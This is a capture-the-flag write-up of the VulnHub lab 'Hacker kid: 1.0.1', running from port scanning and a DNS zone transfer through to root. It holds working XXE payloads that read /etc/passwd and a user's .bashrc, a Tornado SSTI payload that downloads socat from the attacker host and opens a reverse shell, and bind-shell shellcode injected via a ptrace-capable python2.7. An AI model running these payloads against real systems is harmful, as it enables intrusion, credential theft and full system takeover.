# Hacker kid: 1.0.1

## Introduction

Welcome to my another writeup! In this VulnHub [Hacker kid: 1.0.1](https://www.vulnhub.com/entry/hacker-kid-101,719/) box, you'll learn: Fuzzing GET parameter via `ffuf`, DNS zone transfer, exploiting XXE injection, exploiting RCE via SSTI in Tornado template engine, privilege escalation via misconfigurated `python2.7` with `CAP_SYS_PTRACE` capability, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: saket to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

Difficulty: Easy/Medium (Intermediate)

This box is OSCP style and focused on enumeration with easy exploitation.The goal is to get root.No guessing or heavy bruteforce is required and proper hints are given at each step to move ahead.

## Service Enumeration

**Host discovery:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|16:18:07(HKT)]
└> sudo netdiscover -r 10.69.96.0/24
[...]
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.69.96.1      00:50:56:c0:00:08      1      60  VMware, Inc.                                           
 10.69.96.2      00:50:56:ef:bb:e8      1      60  VMware, Inc.                                           
 10.69.96.74     00:0c:29:63:51:02      1      60  VMware, Inc.                                           
 10.69.96.200    00:50:56:f4:38:15      1      60  VMware, Inc.
```

- Target machine IP address: `10.69.96.74`
- Attacker machine IP address: `10.69.96.100`

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|16:19:08(HKT)]
└> export RHOSTS=10.69.96.74
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|16:19:10(HKT)]
└> export LHOST=`ifconfig eth0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|16:19:15(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.69.96.74:53
Open 10.69.96.74:80
Open 10.69.96.74:9999
[...]
PORT     STATE SERVICE REASON  VERSION
53/tcp   open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Notorious Kid : A Hacker 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9999/tcp open  http    syn-ack Tornado httpd 6.1
|_http-server-header: TornadoServer/6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
| http-methods: 
|_  Supported Methods: GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|16:19:10(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
PORT   STATE SERVICE
53/udp open  domain
```

According to `rustscan` and `nmap` result, the target machine has 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|53/TCP/UDP        | ISC BIND 9.16.1 (Ubuntu Linux)|
|80/TCP            | Apache httpd 2.4.41 ((Ubuntu))|
|9999/TCP          | Tornado httpd 6.1             |

### DNS on TCP/UDP port 53

**Check for all records in the DNS server:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|16:20:19(HKT)]
└> dig -t ANY $RHOSTS

; <<>> DiG 9.18.16-1-Debian <<>> -t ANY 10.69.96.74
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 41574
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;10.69.96.74.			IN	ANY

;; AUTHORITY SECTION:
.			86393	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2023081700 1800 900 604800 86400

;; Query time: 3 msec
;; SERVER: 10.69.96.2#53(10.69.96.2) (TCP)
;; WHEN: Thu Aug 17 16:20:19 HKT 2023
;; MSG SIZE  rcvd: 115
```

No records for the target IP address.

### HTTP on TCP port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817162213.png)

Hmm... Looks like the server already been hacked.

**View source page:**
```html
[...]
<!--
<div class="container py-5">
  <h1>Thanks</h1>
 TO DO: Use a GET parameter page_no  to view pages.
-->
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
[...]
```

**We found an HTML comment:**
```
TO DO: Use a GET parameter page_no  to view pages
```

**When we provide GET parameter `page_no`, it'll append a message:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817162519.png)

No sure what's it. I also tried SQL injection, IDOR (Insecure Direct Object Reference), but nothing weird.

**I then fuzzed that GET parameter, and I found value `21` has a different response size:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|17:10:46(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://$RHOSTS/index.php?page_no=FUZZ -fs 3654 
[...]
[Status: 200, Size: 3849, Words: 639, Lines: 117, Duration: 4ms]
    * FUZZ: 21
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817171157.png)

**Oh! We found a domain!**

- Domain: `blackhat.local`

### HTTP on TCP port 9999

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817163305.png)

In here, when we're not authenticated, it'll redirect us to a login page.

**We can try to guess some weak credentials, like `admin:admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817163515.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817163525.png)

Hmm... Something wrong with my data??

I also tried authentication bypass via SQL/NoSQL injection, but no dice.

## Initial Foothold

Let's take a step back.

Since we found a domain via the `page_no` GET parameter, and a hint "DIG" in the index page of TCP port 80, we can try to query records from the DNS server.

**To do so, we can use a tool called `dig`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|17:13:22(HKT)]
└> dig -t ANY blackhat.local @$RHOSTS
[...]
;; ANSWER SECTION:
blackhat.local.		10800	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
blackhat.local.		10800	IN	NS	ns1.blackhat.local.
blackhat.local.		10800	IN	MX	10 mail.blackhat.local.
blackhat.local.		10800	IN	A	192.168.14.143

;; ADDITIONAL SECTION:
ns1.blackhat.local.	10800	IN	A	192.168.14.143
mail.blackhat.local.	10800	IN	A	192.168.14.143
[...]
```

Oh! We found some DNS records!

**Try DNS zone transfer:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|17:15:03(HKT)]
└> dig -t AXFR blackhat.local @$RHOSTS
[...]
blackhat.local.		10800	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
blackhat.local.		10800	IN	NS	ns1.blackhat.local.
blackhat.local.		10800	IN	MX	10 mail.blackhat.local.
blackhat.local.		10800	IN	A	192.168.14.143
ftp.blackhat.local.	10800	IN	CNAME	blackhat.local.
hacker.blackhat.local.	10800	IN	CNAME	hacker.blackhat.local.blackhat.local.
mail.blackhat.local.	10800	IN	A	192.168.14.143
ns1.blackhat.local.	10800	IN	A	192.168.14.143
ns2.blackhat.local.	10800	IN	A	192.168.14.143
www.blackhat.local.	10800	IN	CNAME	blackhat.local.
blackhat.local.		10800	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
[...]
```

> DNS zone transfer is a vulnerability that allows attackers to query enumerate the entire domain's DNS records.

**Nice! Let's add those subdomains to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|17:16:51(HKT)]
└> echo "$RHOSTS blackhat.local hacker.blackhat.local hackerkid.blackhat.local" | sudo tee -a /etc/hosts
10.69.96.74 blackhat.local hacker.blackhat.local hackerkid.blackhat.local
```

**`hacker.blackhat.local`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817171940.png)

This subdomain points to the first web application that we've enumerated.

**`blackhat.local`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817172245.png)

When we go to `/`, it just returned HTTP status "404 Not Found".

**We can enumerate hidden directories and files via content discovery:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|17:18:40(HKT)]
└> gobuster dir -u http://blackhat.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/templates            (Status: 301) [Size: 320] [--> http://blackhat.local/templates/]
/javascript           (Status: 301) [Size: 321] [--> http://blackhat.local/javascript/]
[...]
```

When we go to `/templates/`, it respond us with a raw HTML template. Maybe it's used in TCP port 9999's web application?

Also, maybe there's a SSTI (Server-Side Template Injection) vulnerability in `current_user`?

**`hackerkid.blackhat.local`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817173431.png)

Oh! We can create a new account?

Let's try that:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817173515.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817173906.png)

Hmm? "Sorry, `siunam@attacker.local` is not available !!!"?

**Burp Suite's HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817174724.png)

So, because of the POST data is in XML (Extensible Markup Language) format, which makes me think of **`process.php` may vulnerable to XXE (XML External Entity) injection!**

Since the value of **`<email>` tag is reflected** to the response, **we can try to use an external entity in that tag!**

> For more information about XXE injection, you can read PortSwigger's Web Security Academy about XXE injection: [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe).

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root>
    <name>siunam</name>
    <tel>123456789</tel>
    <email>&xxe;</email>
    <password>password</password>
</root>
```

This XXE injection payload will retrieve the content of `/etc/passwd`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817174934.png)

Nice! It's indeed vulnerable to XXE injection!

**We also found system user `saket` from the content of `/etc/passwd`:**
```shell
root:x:0:0:root:/root:/bin/bash
[...]
saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
[...]
```

According to the hint in the `page_no` GET parameter, it said: "Out of my many homes...one such home..one such home for me", **maybe we can read user `saket`'s `.bash_history` or `.bashrc`??**

**To do so, we can use PHP wrapper's `php://filter` to base64 encode the content:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///home/saket/.bashrc'>]>
<root>
    <name>siunam</name>
    <tel>123456789</tel>
    <email>&xxe;</email>
    <password>password</password>
</root>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817182751.png)

**Base64 decoded:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:29:07(HKT)]
└> nano saket_bashrc.b64 
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:29:25(HKT)]
└> base64 -d saket_bashrc.b64 > saket_bashrc
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:29:38(HKT)]
└> tail -n 3 saket_bashrc
#Setting Password for running python app
username="admin"
password="{Redacted}"
```

Nice! We found a credential for the Python web application (TCP port 9999)!

**Let's login to that account!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183051.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183309.png)

Uhh?? Still wrong?

**Maybe the username is `saket`??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183334.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183347.png)

It is!

After logged in, it says: "Tell me your name buddy".

**Hmm... What if I provide a GET parameter called `name`??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183439.png)

It worked, and the name got reflected.

We can get reflected XSS (Cross-Site Scripting) in here, but it's useless in this case:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183549.png)

**Hmm... Maybe exploiting the SSTI vulnerability? We found the template in `blackhat.local/templates/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817183737.png)

Nice! It's vulnerable to SSTI!

Let's try to get RCE (Remote Code Execution) via SSTI!

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python), we can get RCE via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817184001.png)

**However, the above payload only returns the exit code `0` (Successful execution) and we can't see the output, so I modified the payload:**
```tornado
{{__import__('os').popen('id').read()}}
```

> Note: This payload will **dynamically** import the `os` module, and using `popen()` method to execute commands. Finally, use `read()` method to retrieve the output of the executed command.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817184207.png)

**Let's get a reverse shell!**

- Setup a socat listener (For fully interactive shell)

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:42:55(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/17 18:43:15 socat[289955] N opening character device "/dev/pts/3" for reading and writing
2023/08/17 18:43:15 socat[289955] N listening on AF=2 0.0.0.0:443
```

- Host the `socat` binary via Python's `http.server` module:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:43:33(HKT)]
└> file /opt/static-binaries/binaries/linux/x86_64/socat
/opt/static-binaries/binaries/linux/x86_64/socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:43:35(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86_64/ 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```tornado
{{__import__('os').popen('wget http://10.69.96.100/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.69.96.100:443 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane').read()}}
```

**URL encoded:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Hacker-kid:1.0.1/images/Pasted%20image%2020230817184836.png)

```tornado
{{__import__('os').popen('wget%20http%3A%2F%2F10%2E69%2E96%2E100%2Fsocat%20%2DO%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20TCP%3A10%2E69%2E96%2E100%3A443%20EXEC%3A%22%2Fbin%2Fbash%22%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane').read()}}
```

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|18:42:55(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/17 18:43:15 socat[289955] N opening character device "/dev/pts/3" for reading and writing
2023/08/17 18:43:15 socat[289955] N listening on AF=2 0.0.0.0:443
                                                                 2023/08/17 18:47:48 socat[289955] N accepting connection from AF=2 10.69.96.74:58998 on AF=2 10.69.96.100:443
                                                                   2023/08/17 18:47:48 socat[289955] N starting data transfer loop with FDs [5,5] and [7,7]


saket@ubuntu:~$ 
saket@ubuntu:~$ 
saket@ubuntu:~$ export TERM=xterm-256color
saket@ubuntu:~$ stty rows 22 columns 107
saket@ubuntu:~$ ^C
saket@ubuntu:~$ whoami; hostname; id; ip a
saket
ubuntu
uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:63:51:02 brd ff:ff:ff:ff:ff:ff
    altname enp2s1
    inet 10.69.96.74/24 brd 10.69.96.255 scope global dynamic noprefixroute ens33
       valid_lft 1074sec preferred_lft 1074sec
    inet6 fe80::fc10:35cb:9bea:8aff/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

I'm user `saket`!

## Privilege Escalation

### saket to root

After gaining initial foothold on a target machine, we need to escalate our privilege. To do so, we need to enumerate the system.

**Sudo permission:**
```shell
saket@ubuntu:~$ sudo -l
[sudo] password for saket: 
Sorry, try again.
```

I also tried password reuse from the Python web application, but no luck.

**SUID binaries:**
```shell
saket@ubuntu:~$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/chsh
/usr/sbin/pppd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

All were default SUID binaries.

**Firefox profile:**
```shell
saket@ubuntu:~$ ls -lah .mozilla/firefox/28lxu8q7.default-release/
total 13M
drwx------ 15 saket saket 4.0K Jun 28  2021 .
drwx------  6 saket saket 4.0K Jun 26  2021 ..
-rw-rw-r--  1 saket saket 2.0K Jun 27  2021 addons.json
-rw-------  1 saket saket 3.5K Jun 28  2021 addonStartup.json.lz4
[...]
```

Maybe we can decrypt some passwords from the profile?

**Bash history:**
```shell
saket@ubuntu:~$ cat .bash_history 
[...]
nautilus .
zip -p superman zipped_apk.zip SaketApp.apk 
zip -p superman zipped_apk.zip ../.debug/
nautilus .
sudo su
nc 127.0.0.1 5600
[...]
python2.7 inject.py 405
nc 127.0.0.1 5600
ps -eax|grep root
ps -eaf|grep root
python2.7 inject.py 735
nc 127.0.0.1 5600
ls
rm -rf inject.py 
sudo su
```

What's that `SaketApp.apk`??

```shell
saket@ubuntu:~$ find / -name "SaketApp.apk" 2>/dev/null
/home/saket/.cache/vmware/drag_and_drop/GILjfk/SaketApp.apk
```

No clue what it is.

**Capabilities:**
```shell
saket@ubuntu:~$ /usr/sbin/getcap -r / 2>/dev/null
/snap/core22/858/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Oh! We can see **`/usr/bin/python2.7` has `cap_sys_ptrace` capability**!

According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace) and [https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc), we can escalate our privilege to `root`!

> `CAP_SYS_PTRACE` means that you can escape the container by injecting a shellcode inside some process running inside the host. (From [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace))

- Find Apache's master Process ID (PID):

```shell
saket@ubuntu:~$ ps -eaf
UID          PID    PPID  C STIME TTY          TIME CMD
[...]
root        1042       1  0 01:06 ?        00:00:03 /usr/sbin/apache2 -k start
[...]
www-data    3538    1042  0 02:43 ?        00:00:01 /usr/sbin/apache2 -k start
[...]
```

**Apache's master process ID: `1042`**

- Check the architecture of the machine:

```shell
saket@ubuntu:~$ arch
x86_64
```

It's a 64-bit Linux machine.

- Grab the 64-bit Linux bind shellcode from [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128):

```c
\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05
```

The above shellcode will trigger a bind TCP shell on port 5600.

- Copy the Python exploit from [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace) and paste it to the target machine: (You can replace the shellcode to the one that you grabbed from Exploit-DB.)

```shell
saket@ubuntu:~$ nano /tmp/inject.py
```

- Run the exploit with the Apache PID:

```shell
saket@ubuntu:~$ /usr/bin/python2.7 /tmp/inject.py 1042
Instruction Pointer: 0x7f8a7b8630daL
Injecting Shellcode at: 0x7f8a7b8630daL
Shellcode Injected!!
Final Instruction Pointer: 0x7f8a7b8630dcL
```

**Check the bind TCP shell is listening or not:**
```shell
saket@ubuntu:~$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
[...]              
tcp        0      0 0.0.0.0:5600            0.0.0.0:*               LISTEN      -                   
[...]
```

The exploit worked!

- Connect to the bind TCP shell:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Hacker-kid:1.0.1)-[2023.08.17|20:16:04(HKT)]
└> nc -nv $RHOSTS 5600
(UNKNOWN) [10.69.96.74] 5600 (?) open
whoami; hostname; id; ip a
root
ubuntu
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:63:51:02 brd ff:ff:ff:ff:ff:ff
    altname enp2s1
    inet 10.69.96.74/24 brd 10.69.96.255 scope global dynamic noprefixroute ens33
       valid_lft 1608sec preferred_lft 1608sec
    inet6 fe80::fc10:35cb:9bea:8aff/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

I'm `root`! :D

## Conclusion

What we've learned:

1. Fuzzing GET parameter via `ffuf`
2. DNS zone transfer
3. Exploiting XXE injection
4. Exploiting RCE via SSTI in Tornado template engine
5. Vertical privilege escalation via misconfigurated `python2.7` with `CAP_SYS_PTRACE` capability